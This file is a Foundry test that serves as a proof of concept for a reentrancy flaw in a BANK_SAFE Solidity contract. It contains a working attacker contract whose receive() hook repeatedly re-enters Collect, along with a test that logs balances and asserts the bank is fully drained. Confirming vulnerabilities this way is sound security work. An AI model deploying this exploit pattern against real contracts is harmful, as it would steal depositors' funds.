// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x561eac93c92360949ab1f1403323e6db345cbf31.sol";

contract BANK_ReentrancyTest is Test {
    BANK_SAFE public bank;
    AttackReentrancy public attacker;
    
    uint256 constant DEPOSIT_AMOUNT = 2 ether;
    uint256 constant ATTACK_DEPOSIT = 1 ether;
    uint256 constant MIN_SUM = 0.1 ether;

    function setUp() public {
        // Deploy bank and initialize
        bank = new BANK_SAFE();
        bank.SetLogFile(address(new LogFile()));
        bank.SetMinSum(MIN_SUM);
        
        // Deposit from test contract
        vm.deal(address(this), DEPOSIT_AMOUNT);
        bank.Deposit{value: DEPOSIT_AMOUNT}();
        
        // Deploy attacker and fund it
        attacker = new AttackReentrancy(bank);
        vm.deal(address(attacker), ATTACK_DEPOSIT);
    }

    function testReentrancyDrain() public {
        // Depositing the attacker's funds
        attacker.depositSelf();
        
        // Pre-attack snapshot
        console.log("--- BEFORE-Trigger Balances ---");
        uint256 bankBalanceBefore = address(bank).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        console.log("Bank Contract ETH Balance: %e", bankBalanceBefore);
        console.log("Attacker Contract ETH Balance: %e", attackerBalanceBefore);
        
        // Trigger attack
        console.log("--- Trigger attack() ---");
        attacker.attack();
        
        // Post-attack snapshot
        console.log("--- AFTER-Trigger Balances ---");
        uint256 bankBalanceAfter = address(bank).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 ethDiff = bankBalanceBefore - bankBalanceAfter;
        
        console.log("Bank Contract ETH Balance: %e", bankBalanceAfter);
        console.log("Attacker Contract ETH Balance: %e", attackerBalanceAfter);
        console.log("ETH Transferred: %e", ethDiff);
        
        // Final vulnerability verification
        uint256 expectedGain = bankBalanceBefore; // Should gain entire bank balance
        bool bankDrained = bankBalanceAfter == 0;
        bool attackerProfited = attackerBalanceAfter == attackerBalanceBefore + expectedGain;
        
        console.log("Vulnerability verification:");
        console.log("- Bank drained: ", bankDrained ? "YES" : "NO");
        console.log("- Attacker profited: ", attackerProfited ? "YES" : "NO");
        
        if (bankDrained && attackerProfited) {
            console.log("Final Verdict: Vulnerability Exists: Reentrancy attack successfully drained bank ETH");
        } else {
            console.log("Final Verdict: Vulnerability not Exist: Attack did not drain bank as expected");
        }
        
        // Original test assertions maintained
        assertEq(bankBalanceAfter, 0, "Bank not drained");
        assertEq(attackerBalanceAfter, attackerBalanceBefore + bankBalanceBefore, "Profit mismatch");
    }
}

contract AttackReentrancy {
    BANK_SAFE public immutable bank;
    
    constructor(BANK_SAFE _bank) {
        bank = _bank;
    }
    
    function depositSelf() public {
        bank.Deposit{value: address(this).balance}();
    }

    function attack() public {
        bank.Collect(1 ether);
    }
    
    // Handle ETH transfers with empty calldata
    receive() external payable {
        if (address(bank).balance >= 0.1 ether) {
            bank.Collect(1 ether);
        }
    }
}